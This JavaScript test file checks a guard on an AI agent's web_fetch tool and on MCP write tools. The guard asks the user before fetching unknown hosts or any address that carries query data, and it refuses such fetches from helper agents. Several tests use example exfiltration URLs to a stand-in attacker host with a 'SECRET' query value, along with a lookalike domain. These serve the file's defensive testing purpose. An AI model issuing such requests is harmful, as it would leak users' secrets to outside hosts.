import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { fetchDecision, guardFetch, trustedHost } from '../src/fetch-guard.mjs';
import { mcpWriteAction } from '../src/handoff-policy.mjs';
import { fakeCtx, fakeOwner } from './helpers/fakes.mjs';
import { loadWithFakePi } from './helpers/fake-pi.mjs';
import { makeWorld } from './helpers/world.mjs';

// web_fetch guard (parity F032, F033): documentation is read freely, another site is asked once per conversation, an address that
// carries a query or fragment is asked every time (data could ride along), and a helper never asks.
test('documentation and registries are read freely', () => {
  for (const url of ['https://docs.python.org/3/library/json.html', 'https://registry.npmjs.org/left-pad', 'https://developer.mozilla.org/en-US/docs/Web?x=1#a'])
    assert.equal(fetchDecision({}, 'main', url), null, url);
  assert.equal(trustedHost('GITHUB.COM.'), true);
  assert.equal(trustedHost('github.com.evil.example'), false);
});

test('another site: asked once; a query or fragment: asked every time; Bypass asks only about the latter', () => {
  const known = new Set(['blog.example']);
  assert.equal(fetchDecision({}, 'main', 'https://blog.example/post'), 'ask');
  assert.equal(fetchDecision({ known }, 'main', 'https://blog.example/post'), null);
  assert.equal(fetchDecision({ known }, 'main', 'https://blog.example/post?d=secret'), 'ask');
  assert.equal(fetchDecision({ known }, 'main', 'https://blog.example/post#x'), 'ask');
  assert.equal(fetchDecision({ onlyHandoff: true }, 'main', 'https://blog.example/post'), null);
  assert.equal(fetchDecision({ onlyHandoff: true }, 'main', 'https://attacker.example/?d=SECRET'), 'ask');
  assert.equal(fetchDecision({}, 'main', 'not a url'), null);
});

test('a helper cannot ask the member: it is told to hand the address to the main agent', async () => {
  assert.equal(fetchDecision({}, 'helper', 'https://blog.example/post'), 'refuse');
  const { owner } = fakeOwner();
  await assert.rejects(guardFetch(owner, 'helper', 'https://blog.example/post', fakeCtx()), /managed-web-fetch-needs-member/);
});

test('exfiltration refused: a declined fetch of an address carrying data is not made; an approved plain host is remembered', async () => {
  const { owner } = fakeOwner();
  const ctx = fakeCtx([false, true]);
  await assert.rejects(guardFetch(owner, 'main', 'https://attacker.example/?d=SECRET', ctx), /managed-operation-denied/);
  await guardFetch(owner, 'main', 'https://blog.example/post', ctx);
  await guardFetch(owner, 'main', 'https://blog.example/other', ctx);
  assert.equal(ctx.asked.length, 2, 'the second address on an approved host is not asked about');
  assert.match(ctx.asked[0].body, /attacker\.example/);
});

const world = makeWorld();
let host;
before(async () => { host = await loadWithFakePi(world); });
after(async () => { await host.close(); world.dispose(); });

test('the guard is wired to web_fetch calls, and MCP tools that write ask in every mode', async () => {
  const ask = (toolName, input) => host.fire('tool_call', { toolName, input }, host.ctx);
  host.ui.ui.confirm = async () => false;
  const [blocked] = await ask('web_fetch', { url: 'https://attacker.example/?d=SECRET' });
  assert.equal(blocked.block, true);
  const [free] = [await ask('web_fetch', { url: 'https://docs.python.org/3/' })];
  assert.deepEqual(free, []);
  const [mcp] = await ask('mcp__github__create_issue', { title: 'x' });
  assert.equal(mcp.block, true);
  assert.deepEqual(await ask('mcp__github__list_issues', {}), []);
  assert.deepEqual(await ask('read', { path: 'x' }), []);
  for (const tool of ['create_pull_request', 'push_files', 'send_message']) assert.ok(mcpWriteAction(tool), tool);
  for (const tool of ['get_file_contents', 'list_issues', 'search_code']) assert.equal(mcpWriteAction(tool), null, tool);
});
